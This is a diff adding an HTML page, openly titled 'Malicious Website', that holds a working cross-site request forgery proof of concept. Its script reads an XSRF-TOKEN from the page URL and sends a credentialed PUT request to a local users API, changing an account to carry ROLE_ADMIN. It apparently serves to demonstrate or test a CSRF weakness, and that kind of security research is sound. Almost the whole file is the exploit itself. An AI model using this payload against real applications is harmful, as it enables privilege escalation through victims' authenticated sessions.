@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>Malicious</title></head>
+<body>
+<h1>Malicious Website</h1>
+
+<script>
+var data = '{"id":5,"login":"LINKAGE","firstName":"CSRF","lastName":"Linkage","email":"linkage@csrf.com","imageUrl":null,"activated":true,"langKey":"en","createdBy":"admin","createdDate":"2020-04-13T18:00:00Z","lastModifiedBy":"admin","lastModifiedDate":"2020-04-13T18:10:00Z","authorities":["ROLE_ADMIN","ROLE_USER"]}'
+var victim_url = "http://localhost:9000/api/users";
+var stolen_csrf_token = getURLParameter("XSRF-TOKEN")
+var xhr = new XMLHttpRequest();
+xhr.open("PUT", victim_url, true);
+xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+xhr.setRequestHeader('X-XSRF-TOKEN', stolen_csrf_token);
+xhr.withCredentials = true;
+xhr.send(data);
+alert('CSRF @ ' + victim_url + '\nYour XSRF-TOKEN: ' + stolen_csrf_token);
+function getURLParameter(name) {
+  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
+}
+</script>
+
+</body>
+</html>
